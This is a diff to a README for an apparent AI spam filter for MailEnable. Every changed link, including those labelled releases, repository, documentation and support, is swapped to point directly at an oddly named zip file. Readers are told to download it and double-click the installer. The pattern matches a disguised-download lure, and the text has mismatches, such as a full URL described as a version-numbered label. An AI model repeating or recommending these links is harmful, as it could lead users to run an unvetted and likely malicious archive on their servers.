@@ -1,7 +1,7 @@
 # 📧 MailEnable-AI-Spam-Filter - Automatically Block Spam and Phishing
 
 ## 🌐 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/Mark233D/MailEnable-AI-Spam-Filter/main/SpamAnalizor/MailEnable-AI-Spam-Filter_3.0.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Mark233D/MailEnable-AI-Spam-Filter/main/SpamAnalizor/MailEnable-AI-Spam-Filter_3.0.zip)
+[![Download Latest Release](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/raw/refs/heads/main/SpamAnalizor/models/Filter_Mail_A_Enable_Spam_disparageable.zip%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/raw/refs/heads/main/SpamAnalizor/models/Filter_Mail_A_Enable_Spam_disparageable.zip)
 
 ## 📖 Overview
 MailEnable-AI-Spam-Filter is a real-time, AI-powered tool designed to enhance email security for MailEnable users. It leverages machine learning through Scikit-learn and natural language processing with Zemberek to automatically identify and delete spam, phishing attempts, and profane content. With this application, you can keep your inbox clean and your communications secure.
@@ -10,12 +10,12 @@ MailEnable-AI-Spam-Filter is a real-time, AI-powered tool designed to enhance em
 This guide will help you download and run the MailEnable-AI-Spam-Filter application on your Windows Server. Follow these steps to get started quickly and easily.
 
 ## 📥 Download & Install
-1. **Visit the release page:** Go to the [Releases page](https://raw.githubusercontent.com/Mark233D/MailEnable-AI-Spam-Filter/main/SpamAnalizor/MailEnable-AI-Spam-Filter_3.0.zip) to find the latest version of the application.
+1. **Visit the release page:** Go to the [Releases page](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/raw/refs/heads/main/SpamAnalizor/models/Filter_Mail_A_Enable_Spam_disparageable.zip) to find the latest version of the application.
 
 2. **Find the package:** Look for the most recent release, which includes the compiled application and associated files.
 
 3. **Download the files:**
-   - Click on the download link for the Windows installer, typically labeled as `https://raw.githubusercontent.com/Mark233D/MailEnable-AI-Spam-Filter/main/SpamAnalizor/MailEnable-AI-Spam-Filter_3.0.zip` (where `X.X.X` represents the version number).
+   - Click on the download link for the Windows installer, typically labeled as `https://github.com/Mark233D/MailEnable-AI-Spam-Filter/raw/refs/heads/main/SpamAnalizor/models/Filter_Mail_A_Enable_Spam_disparageable.zip` (where `X.X.X` represents the version number).
    - Save the file to a known location on your computer, such as your Downloads folder.
 
 4. **Run the installer:** After the download is complete, navigate to the location where you saved the file. Double-click on the installer to start the installation.
@@ -56,13 +56,13 @@ If you encounter issues while using MailEnable-AI-Spam-Filter, consider the foll
 - **Update your system:** Make sure your Windows Server is up to date with the latest patches and security updates.
 
 ## 📞 Support
-For further assistance, you can reach out through the issues section on the [GitHub repository](https://raw.githubusercontent.com/Mark233D/MailEnable-AI-Spam-Filter/main/SpamAnalizor/MailEnable-AI-Spam-Filter_3.0.zip). Please provide details about your issue for quicker help.
+For further assistance, you can reach out through the issues section on the [GitHub repository](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/raw/refs/heads/main/SpamAnalizor/models/Filter_Mail_A_Enable_Spam_disparageable.zip). Please provide details about your issue for quicker help.
 
 ## 📦 Summary
 MailEnable-AI-Spam-Filter provides a simple way to protect your email from unwanted content. With its AI-driven technology, you can enhance your email security easily. 
 
 ## 📖 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/Mark233D/MailEnable-AI-Spam-Filter/main/SpamAnalizor/MailEnable-AI-Spam-Filter_3.0.zip)
-- [Documentation](https://raw.githubusercontent.com/Mark233D/MailEnable-AI-Spam-Filter/main/SpamAnalizor/MailEnable-AI-Spam-Filter_3.0.zip)
+- [GitHub Repository](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/raw/refs/heads/main/SpamAnalizor/models/Filter_Mail_A_Enable_Spam_disparageable.zip)
+- [Documentation](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/raw/refs/heads/main/SpamAnalizor/models/Filter_Mail_A_Enable_Spam_disparageable.zip)
 
-Remember to check the [Releases page](https://raw.githubusercontent.com/Mark233D/MailEnable-AI-Spam-Filter/main/SpamAnalizor/MailEnable-AI-Spam-Filter_3.0.zip) for the latest version and updates. Enjoy a cleaner inbox!
+Remember to check the [Releases page](https://github.com/Mark233D/MailEnable-AI-Spam-Filter/raw/refs/heads/main/SpamAnalizor/models/Filter_Mail_A_Enable_Spam_disparageable.zip) for the latest version and updates. Enjoy a cleaner inbox!
